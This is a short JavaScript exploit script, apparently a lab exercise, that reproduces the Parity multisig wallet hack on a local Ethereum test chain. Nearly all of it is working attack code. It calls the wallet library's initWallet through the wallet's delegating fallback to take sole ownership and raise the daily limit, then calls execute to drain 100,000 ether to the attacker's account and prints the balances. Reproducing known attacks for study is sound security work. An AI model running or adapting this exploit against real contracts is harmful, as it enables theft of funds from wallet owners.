let Web3 = require('web3');
let contract = require("truffle-contract");

let provider = new Web3.providers.HttpProvider("http://localhost:8545");
let web3 = new Web3(provider);

let walletAbi = require('./build/contracts/Wallet.json');
let walletLibraryABI = require('./build/contracts/WalletLibrary.json');
var WalletLibrary = contract(walletLibraryABI);
var Wallet = contract(walletAbi);
WalletLibrary.setProvider(provider);
Wallet.setProvider(provider);

//HACK1:
var lib;
var wallet;
// get wallet
Wallet.deployed()
.then((instance) => {
    wallet = instance;
    // point library abi at wallet contract address 
    lib = WalletLibrary.at(instance.address);
    // wallet code has fallback (Wallet.sol:45) which delegates zero value methods to library
    // use it to call the initializer method 'initWallet', assign self as the only owner (note that calling semantics are adding the source address as owner so the owners array parameter is empty)
    // also set daily limit to a high amount
    return lib.initWallet([], 0, web3.toWei(200000, 'ether'), {from: web3.eth.accounts[0], gas: 500000});
})
.then((tx) => {
    // when we have the rights we can use 'execute' to send the ether to our account without
    return lib.execute(web3.eth.accounts[0], web3.toWei(100000, 'ether'), null, {from: web3.eth.accounts[0], gas: 500000});
})
.then((tx) => {
    // check our standings
    console.log('Contgrats!');
    console.log('WALLET:\t' + web3.fromWei(web3.eth.getBalance(wallet.address)) + ' ETH');
    console.log('YOU:\t' + web3.fromWei(web3.eth.getBalance(web3.eth.accounts[0])) + ' ETH');
});
// more explanation: https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7
